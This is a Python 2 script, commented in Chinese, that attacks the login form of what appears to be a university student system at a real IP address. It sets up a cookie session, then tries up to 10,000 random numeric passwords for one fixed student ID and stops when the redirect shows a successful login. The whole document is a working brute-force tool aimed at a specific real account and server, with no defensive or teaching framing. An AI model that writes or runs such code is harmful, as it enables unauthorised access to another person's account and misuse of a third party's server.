#!/usr/bin/python
#-*-coding:utf-8-*-

import urllib
import urllib2
import cookielib
import random
import traceback

#用户获取服务器最初cookie的页面，可以是网站的任意页面
indexurl = 'http://222.194.15.1:7777/zhxt_bks/zhxt_bks.html'
#post数据接收和处理的页面（我们要向这个页面发送我们构造的Post数据）
posturl = 'http://222.194.15.1:7777/pls/wwwbks/bks_login2.login?jym2005=8310.020621129566'

#It is useful for accessing web sites that require small pieces of data – cookies – to be set on the client machine by an HTTP response from a web server, and then returned to the server in later HTTP requests.
cj = cookielib.CookieJar()
cookie_support = urllib2.HTTPCookieProcessor(cj)
#创建http请求处理器
opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
urllib2.install_opener(opener)

#用于接收所有http服务器在本机保存的其他cookie
h = urllib2.urlopen(indexurl)

headers = {
    'User-Agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.83 Safari/535.11',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
    'Accept-Encoding':'gzip,deflate,sdch',
    'Accept-Language':'en-US,en;q=0.8',
    'Cache-Control':'no-cache',
    'Connection':'keep-alive',
    'Host':'222.194.15.1:7777',
    'Origin':'http://222.194.15.1:7777',
    'Pragma':'no-cache',
    'Referer':'http://222.194.15.1:7777/zhxt_bks/xk_login.html',
}

for i in xrange(10000):
    password = random.randrange(1000,60000)
    postdata = {
        'stuid':'101110313',
        'pwd':str(password),
    }
    postdata = urllib.urlencode(postdata)
    request = urllib2.Request(posturl, postdata, headers)
    #用于登录网站，获取http服务器保存在本机的cookie，然后在以后每次请求时都会加上这个cookie
    print password
    try:
        if urllib2.urlopen(request).geturl() == "http://222.194.15.1:7777/pls/wwwbks/bks_login2.loginmessage":
            break
    except Exception,e:
        traceback.print_stack()
        cj = cookielib.CookieJar()
        cookie_support = urllib2.HTTPCookieProcessor(cj)
        opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
        urllib2.install_opener(opener)

        h = urllib2.urlopen(indexurl)

